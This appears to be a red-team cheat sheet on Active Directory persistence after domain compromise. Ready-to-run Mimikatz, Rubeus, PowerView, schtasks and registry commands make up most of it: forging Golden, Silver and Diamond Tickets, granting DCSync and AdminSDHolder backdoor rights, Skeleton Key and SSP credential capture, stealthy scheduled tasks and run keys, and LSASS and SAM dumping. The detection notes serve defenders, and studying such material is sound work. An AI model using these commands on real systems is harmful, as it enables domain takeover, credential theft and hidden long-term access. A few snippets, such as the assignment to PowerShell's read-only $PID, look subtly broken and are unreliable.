---
title: "Persistence — From Windows"
description: "Domain persistence techniques after AD compromise: Golden/Silver/Diamond Tickets, DCSync backdoors, AdminSDHolder, ACL abuse, WMI subscriptions, and DPAPI backup keys."
weight: 7
tags: ["active-directory", "persistence", "windows", "mimikatz", "rubeus", "dpapi", "golden-ticket"]
---

## Quick Reference Table

| Technique | Tool | Requirement | Stealth Level |
|-----------|------|-------------|---------------|
| Golden Ticket | Mimikatz / Rubeus | krbtgt hash + DOMAIN_SID | Medium |
| Silver Ticket | Mimikatz / Rubeus | Service account hash | High |
| Diamond Ticket | Rubeus | krbtgt AES256 + DA creds | High |
| DCSync rights backdoor | PowerView | Domain Admin | Low |
| AdminSDHolder abuse | PowerView | Domain Admin | Low |
| DPAPI Backup Key | SharpDPAPI | Domain Admin | High |
| Skeleton Key | Mimikatz | Domain Admin (LSASS access) | Low |
| WMI Event Subscription | PowerShell | Local Admin | Medium |
| SID History | Mimikatz | Domain Admin | Medium |

---

## DCSync

**What it is:** Abuse of the Directory Replication Service (DRS) protocol to impersonate a domain controller and request password data for any account directly from a legitimate DC. No file on disk needs to be touched — the DC simply hands over the hashes on request, because that is exactly what the DRS protocol is designed to do between DCs.

**Required rights:** `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` on the domain root object.

**How domain controllers replicate:** When a new user is created, one DC services the request and then replicates the data to all other DCs via DRS. An attacker with the above ACEs can send the same replication request a DC would send, and a legitimate DC will respond with the requested secret material.

> **Required privileges:** Domain Admin (to perform DCSync), or explicit DS-Replication-Get-Changes + DS-Replication-Get-Changes-All ACEs granted to a controlled account.

Pull the krbtgt hash:

```
mimikatz # lsadump::dcsync /domain:TARGET_DOMAIN /user:krbtgt
```

Pull the Administrator hash:

```
mimikatz # lsadump::dcsync /domain:TARGET_DOMAIN /user:Administrator
```

Pull all accounts in CSV format (useful for offline cracking or bulk analysis):

```
mimikatz # lsadump::dcsync /domain:TARGET_DOMAIN /all /csv
```

Pull AES keys (needed for etype 18 tickets) — requires local admin or active session on the DC:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Rubeus — dump TGT + Kerberos keys from memory (requires local admin on target or active session):

```
Rubeus.exe dump /service:krbtgt /nowrap
```

Pull the hash of a computer account (note the trailing `$`):

```
mimikatz # lsadump::dcsync /domain:TARGET_DOMAIN /user:DC_HOSTNAME$
```

### Grant DCSync Rights to a Backdoor Account

Using PowerView (requires Domain Admin or WriteDACL on the domain root):

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=TARGET_DOMAIN,DC=com" `
    -PrincipalIdentity BACKDOOR_USER `
    -Rights DCSync `
    -Verbose
```

Verify the ACE was written:

```powershell
Get-DomainObjectAcl -Identity "DC=TARGET_DOMAIN,DC=com" -ResolveGUIDs |
    Where-Object { $_.SecurityIdentifier -match "S-1-5" } |
    Where-Object { $_.ActiveDirectoryRights -match "Replication" }
```

Remove the backdoor ACE (cleanup):

```powershell
Remove-DomainObjectAcl -TargetIdentity "DC=TARGET_DOMAIN,DC=com" `
    -PrincipalIdentity BACKDOOR_USER `
    -Rights DCSync
```

> **Detection:** Windows Event ID **4662** (An operation was performed on an object) with `AccessMask 0x100` or `0x40` and property GUIDs `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes) or `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes-All). The highest-fidelity signal is a non-DC machine initiating DRS replication — monitor for source IPs that do not correspond to known DC addresses.

---

## Golden Ticket

**What it is:** A forged Ticket Granting Ticket (TGT) signed with the krbtgt account's secret key. The KDC cannot distinguish a forged TGT from a legitimate one, because the only secret that signs TGTs is the krbtgt key — and the attacker now possesses it.

**Persistence value:** Survives user password changes. Effective until the krbtgt password is rotated **twice** (Microsoft's guidance after a compromise is to rotate it twice with a delay between rotations to avoid breaking in-flight Kerberos sessions across the domain).

**Required material:** krbtgt NTLM hash (RC4, etype 23) or AES256 key (etype 18), DOMAIN_SID, domain FQDN.

> **Required privileges:** No domain privileges required at ticket-use time. krbtgt hash must be obtained via DCSync or NTDS.dit extraction (both require Domain Admin or equivalent).

### Forge with Mimikatz — NTLM Hash (etype 23)

RC4 is noisier and may be blocked in environments that enforce AES-only Kerberos:

```
mimikatz # kerberos::golden /user:fake_admin /domain:TARGET_DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt
```

### Forge with Mimikatz — AES256 Key (etype 18, stealthier)

Preferred when the environment enforces AES encryption to avoid etype anomaly detections:

```
mimikatz # kerberos::golden /user:fake_admin /domain:TARGET_DOMAIN /sid:DOMAIN_SID /aes256:KRBTGT_AES256 /ptt
```

### Custom Group Membership and Extended Lifetime

Embed RID 500 with DA (512), EA (519), Administrators (544), Schema Admins (518), and DC group (516). Ticket lifetime set to approximately 10 years:

```
mimikatz # kerberos::golden /user:fake_admin /domain:TARGET_DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500 /groups:512,519,544,518,516 /startoffset:0 /endin:87600 /renewmax:262080 /ptt
```

### Forge with Rubeus — AES256

```
Rubeus.exe golden /aes256:KRBTGT_AES256 /user:fake_admin /id:500 /domain:TARGET_DOMAIN /sid:DOMAIN_SID /groups:512,519 /startoffset:0 /endin:87600 /renewmax:262080 /ptt
```

### Save to File for Later Use

Save without injecting:

```
mimikatz # kerberos::golden /user:fake_admin /domain:TARGET_DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ticket:golden.kirbi
```

Inject at a later time (from a different session or machine):

```
Rubeus.exe ptt /ticket:golden.kirbi
```

Verify injection:

```cmd
klist
```

Test access to the DC:

```cmd
dir \\DC_HOSTNAME\C$
```

Purge after use:

```cmd
klist purge
```

> **Detection:** Event **4769** (TGS request) without a preceding **4768** (TGT request from the same host). Look for tickets with non-existent usernames, anomalous group SIDs in the PAC, encryption type 23 (RC4) when the domain enforces AES, or ticket lifetimes exceeding domain policy maximums. Microsoft ATA and Defender for Identity flag golden ticket use based on PAC anomaly analysis.

---

## Silver Ticket

**What it is:** A forged service ticket (TGS) signed with a service account's or machine account's secret key. Unlike a Golden Ticket, the DC is never contacted after the ticket is created — the service validates the ticket locally using its own key. This means **no DC-side event logs are generated** at ticket-use time.

**Key limitation:** Silver tickets do not carry a valid KDC signature on the PAC. If PAC validation is enforced on the target host, the service will contact the DC to validate the PAC, which can detect the forgery. Additionally, Kerberos domain names in silver tickets should traditionally be uppercase — lowercase may trigger anomaly alerts.

**Persistence value:** Machine account secrets rotate every 30 days by default. Service account secrets persist until password changed manually.

> **Required privileges:** Service account or machine account NTLM hash (or AES256 key). Can be obtained via Kerberoasting (service accounts), local admin + sekurlsa (machine accounts), or DCSync (any account).

### CIFS — File Share Access

```
mimikatz # kerberos::golden /user:fake_admin /domain:TARGET_DOMAIN /sid:DOMAIN_SID /target:DC_HOSTNAME.TARGET_DOMAIN /service:cifs /rc4:MACHINE_HASH /ptt
```

Rubeus equivalent using AES256:

```
Rubeus.exe silver /service:cifs/DC_HOSTNAME.TARGET_DOMAIN /aes256:AES256_HASH /user:fake_admin /domain:TARGET_DOMAIN /sid:DOMAIN_SID /nowrap
```

### HOST — Scheduled Tasks and Service Control

```
mimikatz # kerberos::golden /user:fake_admin /domain:TARGET_DOMAIN /sid:DOMAIN_SID /target:DC_HOSTNAME.TARGET_DOMAIN /service:host /rc4:MACHINE_HASH /ptt
```

### HTTP — WinRM and PowerShell Remoting

```
mimikatz # kerberos::golden /user:fake_admin /domain:TARGET_DOMAIN /sid:DOMAIN_SID /target:DC_HOSTNAME.TARGET_DOMAIN /service:http /rc4:MACHINE_HASH /ptt
```

Test WinRM access after injection:

```powershell
Enter-PSSession -ComputerName DC_HOSTNAME -Authentication Kerberos
```

### LDAP — LDAP Operations and DCSync via Silver Ticket

Forge an LDAP silver ticket for the DC to perform DCSync without domain admin at the time of use:

```
mimikatz # kerberos::golden /user:fake_admin /domain:TARGET_DOMAIN /sid:DOMAIN_SID /target:DC_HOSTNAME.TARGET_DOMAIN /service:ldap /rc4:MACHINE_HASH /ptt
```

### RPCSS — WMI Remote Execution

```
mimikatz # kerberos::golden /user:fake_admin /domain:TARGET_DOMAIN /sid:DOMAIN_SID /target:DC_HOSTNAME.TARGET_DOMAIN /service:rpcss /rc4:MACHINE_HASH /ptt
```

### MSSQLSvc — SQL Server Access

Useful when a service account has limited SQL privileges but you want sysadmin access by impersonating a known sysadmin in the ticket:

First, convert a plaintext password to a hash if needed:

```
Rubeus.exe hash /user:USERNAME /domain:TARGET_DOMAIN /password:PASSWORD
```

Forge the ticket impersonating a known sysadmin:

```
Rubeus.exe silver /service:MSSQLSvc/SQL_HOSTNAME.TARGET_DOMAIN:1433 /rc4:SERVICE_HASH /user:USERNAME /id:1108 /groups:513 /domain:TARGET_DOMAIN /sid:DOMAIN_SID /nowrap
```

Create a sacrificial logon session and inject:

```cmd
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
```

Then inject the ticket into that LUID:

```
Rubeus.exe ptt /ticket:<base64blob> /luid:<LUID>
```

### Verify and Cleanup

```cmd
klist
klist purge
```

> **Detection:** Silver ticket anomalies are visible when PAC validation is enabled on the service host. Network-level detection: watch for Kerberos AP_REQ traffic to services that does not follow a prior AS_REQ/TGS_REQ exchange on the wire. Sysmon Event ID **3** (network connection) combined with absence of prior DC-bound Kerberos traffic is indicative. Lowercase domain names in Kerberos realm fields are another indicator.

---

## Diamond Ticket

**What it is:** A technique that requests a **real, legitimate TGT** from the KDC, then modifies the PAC in-memory (using the krbtgt AES256 key to re-sign the modified PAC). The result is a ticket with a valid KDC PAC signature but escalated group memberships.

**Why it is harder to detect than a Golden Ticket:** The TGT request generates a genuine Event 4768 at the DC. The ticket has valid Kerberos timestamps, a real user account, and a valid KDC signature on the PAC. The only anomaly is the modified group SIDs — which requires PAC-level inspection to detect.

> **Required privileges:** krbtgt AES256 key (from DCSync), plus either valid DA credentials for the initial TGT request or a delegatable TGT for the requesting principal (tgtdeleg).

### With Explicit DA Credentials

```
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:USERNAME /password:PASSWORD /enctype:aes /ticketuser:fake_admin /ticketuserid:500 /groups:512,519 /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt
```

### Without Plaintext Credentials (tgtdeleg)

`tgtdeleg` abuses unconstrained delegation internally to retrieve a usable TGT for the current user without requiring plaintext credentials:

```
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /tgtdeleg /ticketuser:fake_admin /ticketuserid:500 /groups:512,519 /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt
```

Verify the injected ticket shows the modified groups:

```cmd
klist
```

Test access:

```cmd
dir \\DC_HOSTNAME\C$
```

> **Detection:** A diamond ticket generates a real Event **4768** at the DC, making it significantly harder to detect than a golden ticket. Detection requires PAC content inspection — look for group SID mismatches between the PAC and the actual user object in AD. Defender for Identity and advanced SIEM rules that correlate 4768 with subsequent group membership queries may flag anomalies. The `ticketuser` field in the ticket will match a real account, but the group SIDs in the PAC will not match the account's actual group memberships.

---

## DPAPI Domain Backup Key

**What it is:** The Data Protection API (DPAPI) uses per-user master keys derived from the user's password to encrypt secrets (browser credentials, certificates, Wi-Fi passwords, etc.). A copy of each user's master key is encrypted with a domain-wide backup key stored on the DC. This backup key is generated once during domain creation and — unlike krbtgt — is **never automatically rotated**, even across domain functional level upgrades or DC migrations.

**Persistence value:** Exfiltrating the backup key grants permanent, offline access to every DPAPI-protected blob across the entire domain, for all past and future users, as long as the domain is not rebuilt. Password changes do not invalidate previously encrypted blobs.

> **Required privileges:** Domain Admin (to retrieve the backup key via MS-BKRP from the PDC emulator).

### Extract the Domain Backup Key

Using SharpDPAPI (connects to the DC over the MS-BKRP protocol):

```
SharpDPAPI.exe backupkey /server:DC_HOSTNAME /file:C:\Temp\key.pvk
```

Mimikatz equivalent:

```
mimikatz # dpapi::backupkey /export
```

This writes the key as `ntds_capi_0_GUID.pfx` and `ntds_capi_0_GUID.pvk` in the current directory.

### Decrypt DPAPI-Protected Material Offline

With the `.pvk` backup key, decrypt any user's credential blobs without interacting with the DC or knowing the user's password:

```
SharpDPAPI.exe credentials /pvk:C:\Temp\key.pvk
```

Decrypt vault entries (Windows Credential Manager):

```
SharpDPAPI.exe vaults /pvk:C:\Temp\key.pvk
```

Decrypt certificates (useful for AD CS certificate theft):

```
SharpDPAPI.exe certificates /pvk:C:\Temp\key.pvk
```

Decrypt browser credentials (Chrome, Edge):

```
SharpDPAPI.exe browser /pvk:C:\Temp\key.pvk
```

Enumerate credential blobs on a remote machine using DA credentials, then decrypt with backup key:

```
SharpDPAPI.exe credentials /server:TARGET_HOSTNAME /pvk:C:\Temp\key.pvk
```

> **Detection:** Event **4662** on the PDC emulator with object type `secret` and operation `Read Property`. The MS-BKRP RPC call (`BackupKey` interface, UUID `3dde7c30-165d-11d1-ab8f-00805f14db40`) can be detected on the network. Most environments have no legitimate reason for non-DC machines to query the DPAPI backup key via RPC. DPAPI backup key export via Mimikatz may also generate LSASS memory access events detectable by EDR.

---

## AdminSDHolder Abuse

**What it is:** `AdminSDHolder` is a special AD container object (`CN=AdminSDHolder,CN=System,DC=TARGET_DOMAIN,DC=com`) whose ACL serves as a template. The `SDProp` process (Security Descriptor Propagator) runs every 60 minutes on the PDC emulator and **overwrites the ACLs of all protected accounts and groups** with a copy of the AdminSDHolder ACL. Protected principals include members of Domain Admins, Enterprise Admins, Administrators, Schema Admins, Account Operators, Backup Operators, Print Operators, Server Operators, and several others.

**Why it persists:** Granting a backdoor account GenericAll on AdminSDHolder means that every 60 minutes, SDProp propagates that right to all protected accounts. Even if a defender removes the right from a specific protected account, SDProp will restore it within an hour unless the backdoor ACE on AdminSDHolder itself is removed.

> **Required privileges:** Domain Admin (to modify the AdminSDHolder ACL).

### Grant GenericAll on AdminSDHolder

```powershell
Add-DomainObjectAcl `
    -TargetIdentity "CN=AdminSDHolder,CN=System,DC=TARGET_DOMAIN,DC=com" `
    -PrincipalIdentity BACKDOOR_USER `
    -Rights All `
    -Verbose
```

### Force SDProp to Run Immediately

By default, SDProp runs every 3600 seconds. To trigger propagation without waiting, set the `RunProtectAdminGroupsTask` attribute on the domain root:

```powershell
$RootDSE = [ADSI]"LDAP://RootDSE"
$RootDSE.Put("runProtectAdminGroupsTask", 1)
$RootDSE.SetInfo()
```

Alternatively, use the Invoke-ADSDPropagation function from PowerView (if available in the environment):

```powershell
Invoke-ADSDPropagation
```

### Verify Propagation

After SDProp runs, confirm the ACE was propagated to a DA account:

```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
    Where-Object { $_.SecurityIdentifier -match "BACKDOOR_USER_SID" }
```

### Abuse the Propagated Rights

Reset a DA's password using GenericAll:

```powershell
Set-DomainUserPassword `
    -Identity "TARGET_DA_USERNAME" `
    -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) `
    -Verbose
```

Add the backdoor account to Domain Admins directly:

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members BACKDOOR_USER
```

> **Detection:** Event **4670** (Permissions on an object were changed) on the AdminSDHolder object. Event **4728** (member added to security-enabled global group) when group membership is manipulated via the propagated rights. Periodic auditing of the AdminSDHolder DACL is the primary defensive control — compare against a known-good baseline.

---

## ACL-Based Persistence

ACL abuse provides flexible, low-noise persistence that does not require writing to disk or modifying group memberships. Rights can be leveraged on-demand and may persist undetected indefinitely in environments without ACL auditing.

> **Required privileges:** Domain Admin (to grant rights on high-value objects like the domain root or protected groups).

### GenericAll on Domain Admins Group

```powershell
Add-DomainObjectAcl `
    -TargetIdentity "Domain Admins" `
    -PrincipalIdentity BACKDOOR_USER `
    -Rights All
```

### WriteDACL on Domain Root

`WriteDACL` allows the backdoor account to grant itself any right at any time — including DCSync rights — without requiring existing Domain Admin membership:

```powershell
Add-DomainObjectAcl `
    -TargetIdentity "DC=TARGET_DOMAIN,DC=com" `
    -PrincipalIdentity BACKDOOR_USER `
    -Rights WriteDacl
```

### DCSync Rights (Minimal Footprint)

```powershell
Add-DomainObjectAcl `
    -TargetIdentity "DC=TARGET_DOMAIN,DC=com" `
    -PrincipalIdentity BACKDOOR_USER `
    -Rights DCSync
```

### GenericWrite on a Privileged User Object

Allows modification of attributes like `scriptPath` (logon script), `msDS-KeyCredentialLink` (Shadow Credentials), or `servicePrincipalName` (targeted Kerberoasting):

```powershell
Add-DomainObjectAcl `
    -TargetIdentity "TARGET_DA_USERNAME" `
    -PrincipalIdentity BACKDOOR_USER `
    -Rights WriteProperty
```

### ResetPassword on Privileged Accounts

```powershell
Add-DomainObjectAcl `
    -TargetIdentity "TARGET_DA_USERNAME" `
    -PrincipalIdentity BACKDOOR_USER `
    -Rights ResetPassword
```

### Verify ACEs Are In Place

```powershell
Get-DomainObjectAcl -Identity "DC=TARGET_DOMAIN,DC=com" -ResolveGUIDs |
    Where-Object { $_.SecurityIdentifier -match "BACKDOOR_USER_SID" } |
    Select-Object SecurityIdentifier, ActiveDirectoryRights, AceType
```

### Remove ACEs (Cleanup)

```powershell
Remove-DomainObjectAcl `
    -TargetIdentity "DC=TARGET_DOMAIN,DC=com" `
    -PrincipalIdentity BACKDOOR_USER `
    -Rights DCSync
```

> **Detection:** Event **4662** for ACL modification operations. Event **4670** (object permissions changed). BloodHound ingestion exposes ACL-based paths — defenders who run BloodHound regularly will identify anomalous control paths. ACL auditing must be explicitly enabled on AD objects (it is not enabled by default on most objects). Tools such as `PingCastle`, `Purple Knight`, and `ADACLScanner` are used by defenders to baseline and diff AD ACLs.

---

## Skeleton Key

**What it is:** Mimikatz patches the `lsass.exe` LSASS process in-memory, injecting a backdoor into the Kerberos authentication provider (`wdigest` / `msv1_0`). After the patch, every domain account accepts the password `mimikatz` in addition to the real password. The real password continues to work as normal.

**Limitations:** The patch is in-memory only and does not survive a reboot. It must be re-applied after every DC restart. It also only works on the DC where it was injected — in a multi-DC environment, each DC must be patched separately. Clustered DCs with load balancing will serve authentication requests from un-patched DCs unpredictably.

> **Required privileges:** Domain Admin with interactive access to the DC (LSASS write access required). Typically executed from a high-integrity process on the DC or via PsExec/WinRM into the DC.

```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

Test access using the skeleton key password from any domain machine:

```cmd
net use \\DC_HOSTNAME\C$ /user:TARGET_DOMAIN\Administrator mimikatz
```

Or via PsExec:

```cmd
PsExec.exe \\DC_HOSTNAME -u TARGET_DOMAIN\USERNAME -p mimikatz cmd.exe
```

> **Detection:** Event **4673** (A privileged service was called) with `SeDebugPrivilege`. LSASS process memory write events are captured by EDR solutions (Sysmon Event ID **10** with `GrantedAccess 0x1fffff`). Most modern EDRs detect Mimikatz skeleton key injection via known LSASS modification patterns. Microsoft ATA flags skeleton key attacks based on behavioral anomalies.

---

## Malicious SSP (Security Support Provider)

**What it is:** SSPs are DLLs that plug into the Windows authentication stack. Mimikatz includes a custom SSP (`memssp`) that intercepts and logs all plaintext credentials presented to LSASS during authentication events (logon, runas, network authentication, password changes).

> **Required privileges:** Local Administrator on the DC (LSASS memory write access).

Inject the SSP in-memory (no disk write, no registry modification):

```
mimikatz # privilege::debug
mimikatz # misc::memssp
```

All credentials captured will be written to:

```
C:\Windows\System32\kiwissp.log
```

Read captured credentials from the log:

```powershell
Get-Content C:\Windows\System32\kiwissp.log
```

Alternatively, register a persistent SSP DLL via registry (survives reboot but requires DLL on disk):

```powershell
$CurrentSSP = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa").`Security Packages`
$CurrentSSP += "mimilib"
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages" -Value $CurrentSSP
```

> **Detection:** Event **4622** (A security package has been loaded by the Local Security Authority) for DLL-based SSP registration. In-memory injection via `misc::memssp` does not generate this event but is visible to EDR through LSASS memory write telemetry. The `kiwissp.log` file in `System32` is a high-fidelity IOC.

---

## SID History Injection

**What it is:** The `sIDHistory` attribute on a user object stores SIDs from previous domains (used in migration scenarios). When a user authenticates, all SIDs in their `sIDHistory` are included in their Kerberos PAC and access token. Injecting a privileged SID (e.g., Domain Admins S-1-5-21-...-512) into a backdoor account's SID history grants all privileges associated with that SID — without the account appearing in any privileged group.

**Why it evades group-based detections:** The account is not a member of Domain Admins or any other privileged group. Standard group membership queries and BloodHound group-based analysis will not flag it. Access is conferred via the PAC, which includes SID history.

> **Required privileges:** Domain Admin. Note: SID history injection via Mimikatz requires that the domain functional level patch has been applied and that LSASS patching is successful.

```
mimikatz # privilege::debug
mimikatz # sid::patch
mimikatz # sid::add /sam:BACKDOOR_USER /new:DA_USERNAME
```

Verify the SID history was written:

```powershell
Get-ADUser BACKDOOR_USER -Properties SIDHistory | Select-Object SamAccountName, SIDHistory
```

Cross-domain SID filtering note: if SID filtering is enabled between forests or across trust boundaries, injected SIDs from a trusted domain will be stripped. Within the same domain, SID filtering does not apply.

> **Detection:** Event **4765** (SID history was added to an account) and Event **4766** (An attempt to add SID history to an account failed). Monitoring the `sIDHistory` attribute for modification on user objects is the most reliable detection. BloodHound's Cypher queries can identify accounts with SID history pointing to privileged groups.

---

## WMI Event Subscription (Fileless Persistence)

**What it is:** Windows Management Instrumentation supports permanent event subscriptions that survive reboots. A subscription consists of three objects in the WMI repository: an `__EventFilter` (trigger condition), an `__EventConsumer` (action), and a `__FilterToConsumerBinding` (links the two). These objects are stored in the WMI repository (`C:\Windows\System32\wbem\Repository`) — there is no payload file on disk unless the consumer executes one.

> **Required privileges:** Local Administrator on the target machine.

### Create the Event Filter (Trigger)

This example triggers every 60 seconds based on a system performance counter event:

```powershell
$EventFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$EventFilter.Name = "FILTER_NAME"
$EventFilter.QueryLanguage = "WQL"
$EventFilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$EventFilter.EventNamespace = "root/cimv2"
$EventFilter.Put()
```

### Create the Event Consumer (Action)

```powershell
$EventConsumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$EventConsumer.Name = "CONSUMER_NAME"
$EventConsumer.CommandLineTemplate = "powershell.exe -enc BASE64_PAYLOAD"
$EventConsumer.Put()
```

### Bind Filter to Consumer

```powershell
$FilterConsumerBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$FilterConsumerBinding.Filter = $EventFilter.__PATH
$FilterConsumerBinding.Consumer = $EventConsumer.__PATH
$FilterConsumerBinding.Put()
```

### Enumerate Existing WMI Subscriptions

```powershell
Get-WMIObject -Namespace root\subscription -Class __EventFilter
Get-WMIObject -Namespace root\subscription -Class __EventConsumer
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

### Remove Subscriptions (Cleanup)

```powershell
Get-WMIObject -Namespace root\subscription -Class __EventFilter |
    Where-Object { $_.Name -eq "FILTER_NAME" } |
    Remove-WMIObject

Get-WMIObject -Namespace root\subscription -Class __EventConsumer |
    Where-Object { $_.Name -eq "CONSUMER_NAME" } |
    Remove-WMIObject

Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding |
    Where-Object { $_.Filter -match "FILTER_NAME" } |
    Remove-WMIObject
```

### Remote WMI Subscription Deployment

```powershell
$Options = New-Object System.Management.ConnectionOptions
$Options.Username = "TARGET_DOMAIN\USERNAME"
$Options.Password = "PASSWORD"
$Options.EnablePrivileges = $true
$Scope = New-Object System.Management.ManagementScope("\\TARGET_HOSTNAME\root\subscription", $Options)
$Scope.Connect()
```

> **Detection:** Sysmon Event ID **19** (`WmiEventFilter activity detected`), **20** (`WmiEventConsumer activity detected`), **21** (`WmiEventConsumerToFilter activity detected`). These require Sysmon to be deployed with WMI monitoring enabled. The WMI repository file (`OBJECTS.DATA`) can be parsed offline with tools like `python-cim` to enumerate subscriptions. Defender for Endpoint includes WMI persistence detection. Absence of Sysmon makes this technique very difficult to detect via event logs alone.

---

## Scheduled Task Persistence

Scheduled tasks are a well-understood persistence mechanism. They are logged and monitored, but remain effective against targets without robust task auditing.

> **Required privileges:** Local Administrator for SYSTEM-context tasks. Domain Admin for remote task creation.

### Create Task via cmd (SYSTEM Context)

Runs at logon, executed as SYSTEM:

```cmd
schtasks /create /tn "TASK_NAME" /tr "powershell.exe -enc BASE64_PAYLOAD" /sc onlogon /ru SYSTEM /f
```

Runs daily at 08:00:

```cmd
schtasks /create /tn "TASK_NAME" /tr "cmd.exe /c PAYLOAD" /sc daily /st 08:00 /ru SYSTEM /f
```

Runs once at system startup:

```cmd
schtasks /create /tn "TASK_NAME" /tr "C:\Windows\Temp\PAYLOAD.exe" /sc onstart /ru SYSTEM /f
```

### Remote Task Creation

```cmd
schtasks /create /s DC_IP /u TARGET_DOMAIN\USERNAME /p PASSWORD /tn "TASK_NAME" /tr "PAYLOAD" /sc onlogon /ru SYSTEM /f
```

### Manage Tasks

```cmd
schtasks /query /tn "TASK_NAME" /fo list /v
schtasks /run /tn "TASK_NAME"
schtasks /delete /tn "TASK_NAME" /f
```

### Create Task via PowerShell (Stealthier — Avoids schtasks.exe)

```powershell
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-enc BASE64_PAYLOAD"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -Hidden
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings
Register-ScheduledTask -TaskName "TASK_NAME" -InputObject $Task -Force
```

Hide the task from Task Scheduler UI by modifying the SD on the task XML directly:

```powershell
$TaskPath = "C:\Windows\System32\Tasks\TASK_NAME"
$SD = "D:P(A;;FA;;;BA)(A;;FA;;;SY)"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{TASK_GUID}" -Name "SD" -Value ([byte[]]@())
```

### Enumerate Tasks (Detection Bypass Check)

```powershell
Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" } | Select-Object TaskName, TaskPath, State
```

> **Detection:** Event **4698** (A scheduled task was created), **4702** (updated), **4699** (deleted). Sysmon Event ID **1** captures the process creation when the task fires. `Autoruns.exe` (Sysinternals) flags tasks with unsigned or suspicious binaries. Tasks with no associated program name in the description, tasks in non-standard folders, or tasks using `powershell.exe -enc` are high-fidelity IOCs.

---

## Registry Run Keys

Registry-based persistence is one of the oldest and most heavily monitored mechanisms. It is included here for completeness and for use in environments with minimal EDR coverage.

> **Required privileges:** Administrator for HKLM (all users). Standard user for HKCU (current user only).

### HKLM — Applies to All Users (Requires Admin)

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v KEY_NAME /t REG_SZ /d "C:\Windows\Temp\PAYLOAD.exe" /f
```

### HKCU — Current User Only

```cmd
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v KEY_NAME /t REG_SZ /d "C:\Users\USERNAME\PAYLOAD.exe" /f
```

### RunOnce — Executes Once at Next Logon, Then Deletes Itself

```cmd
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v KEY_NAME /t REG_SZ /d "C:\Users\USERNAME\PAYLOAD.exe" /f
```

### Alternative Run Key Locations (Less Monitored)

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Temp\PAYLOAD.exe" /f
```

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *\0C:\Temp\PAYLOAD.exe" /f
```

### Query Run Keys

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

### Remove Run Key

```cmd
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v KEY_NAME /f
```

> **Detection:** `Autoruns.exe` (Sysinternals) is the gold standard for run key auditing. Event **4657** (A registry value was modified) with the `SACL` enabled on Run key paths. EDR solutions universally monitor HKLM and HKCU Run keys. Less-monitored alternative keys (Winlogon `Userinit`, `BootExecute`) may evade baseline detections but are covered by Autoruns.

---

## Credential Access — LSASS Dump for Re-use

After establishing persistence, extracting credentials from LSASS ensures access even if the initial access vector is remediated.

> **Required privileges:** Local Administrator with SeDebugPrivilege.

### Mimikatz — Full Credential Dump

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### Dump NTLM Hashes Only

```
mimikatz # sekurlsa::msv
```

### Dump Kerberos Tickets from Memory

```
mimikatz # sekurlsa::tickets /export
```

### Process Dump via Task Manager / comsvcs.dll (LOLBAS)

Create a minidump of LSASS using the built-in `comsvcs.dll` — avoids dropping Mimikatz on disk:

```cmd
tasklist /fi "imagename eq lsass.exe"
```

```powershell
$PID = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $PID C:\Windows\Temp\lsass.dmp full
```

Parse the dump offline on an attacker machine:

```
mimikatz # sekurlsa::minidump C:\Temp\lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Dump SAM and SYSTEM Hive (Local Accounts)

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```

Parse offline:

```
mimikatz # lsadump::sam /sam:C:\Temp\SAM /system:C:\Temp\SYSTEM
```

